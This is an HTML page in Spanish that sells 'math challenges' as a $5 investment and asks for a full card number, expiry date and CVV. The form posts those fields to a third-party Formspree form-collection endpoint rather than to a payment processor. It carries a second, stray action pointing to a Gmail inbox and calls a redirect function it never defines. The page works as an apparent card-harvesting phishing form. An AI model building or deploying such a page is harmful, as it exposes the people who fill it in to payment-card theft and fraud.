<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Contacto</title>
    <link rel="stylesheet" href="servicio.css">
    <style>
        .invisible {
            display: none;
        }
    </style>
</head>

<body>

    <main id="main">
        <section id="left">
            <div id="head">
                <h1>¡Supera desafíos matemáticos, invierte hoy!</h1>
                <p>Disfruta de las matemáticas</p>
            </div>
            <h3>Solo por $5</h3>
        </section>
        <section id="right">
            <h1>Compra ya!</h1>
            <form action="https://formspree.io/f/mzbllboz" action="https://mail.google.com/mail/u/0/#inbox"
                method="post" onsubmit="return redirectToAnotherPage();">
                <div id="form-card" class="form-field">
                    <label for="cc-number">Numero de Tarjeta:</label>
                    <input type="text" id="cc-number" name="cc-number" maxlength="19" placeholder="1111 2222 3333 4444"
                        required>
                </div>
                <div id="form-date" class="form-field">
                    <label for="expiry-month">Fecha de Expiracion:</label>
                    <div id="date-val">
                        <select id="expiry-month" name="expiry-month" required>
                            <option value="" disabled selected hidden>Mes</option>
                            <option value="1">01</option>
                            <option value="2">02</option>
                            <option value="3">03</option>
                            <option value="4">04</option>
                            <option value="5">05</option>
                            <option value="6">06</option>
                            <option value="7">07</option>
                            <option value="8">08</option>
                            <option value="9">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <select id="expiry-year" name="expiry-year" required>
                            <option value="" disabled selected hidden>Año</option>
                            <option value="2023">23</option>
                            <option value="2024">24</option>
                            <option value="2025">25</option>
                            <option value="2026">26</option>
                            <option value="2027">27</option>
                            <option value="2028">28</option>
                            <option value="2029">29</option>
                            <option value="2030">30</option>
                            <option value="2031">31</option>
                            <option value="2032">32</option>
                            <option value="2033">33</option>
                            <option value="2034">34</option>
                            <option value="2035">35</option>
                            <option value="2036">36</option>
                            <option value="2037">37</option>
                            <option value="2038">38</option>
                            <option value="2039">39</option>
                            <option value="2040">40</option>
                            <option value="2041">41</option>
                            <option value="2042">42</option>
                            <option value="2043">43</option>
                            <option value="2044">44</option>
                            <option value="2045">45</option>
                            <option value="2046">46</option>
                            <option value="2047">47</option>
                        </select>
                    </div>
                </div>
                <div id="form-sec-code" class="form-field">
                    <label for="sec-code">CVV:</label>
                    <input type="password" id="sec-code" name="sec-code" maxlength="3" placeholder="123" required>
                </div>
                <button type="submit">PAGAR</button>
            </form>
        </section>
    </main>
</body>

</html>
